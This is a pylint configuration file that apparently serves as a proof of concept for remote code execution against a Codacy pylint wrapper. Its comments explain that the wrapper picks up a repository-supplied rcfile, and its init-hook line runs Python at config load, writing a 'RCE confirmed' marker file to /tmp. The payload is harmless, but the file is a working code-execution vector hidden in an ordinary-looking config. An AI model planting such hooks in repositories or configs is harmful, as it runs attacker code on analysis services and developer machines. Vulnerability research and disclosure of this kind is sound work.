[MASTER]
# On the no-patterns branch, the codacy-pylint wrapper passes NO --rcfile (rcfile=None),
# so pylint 1.9.5 falls back to default config discovery from cwd (/src) and finds this file.
# init-hook is a Python expression statement executed by pylint at config load (exec path).
init-hook=open("/tmp/codacy-pylint-rce-confirmed.txt","w").write("RCE confirmed via pylint init-hook exec. cwd="+__import__("os").getcwd())
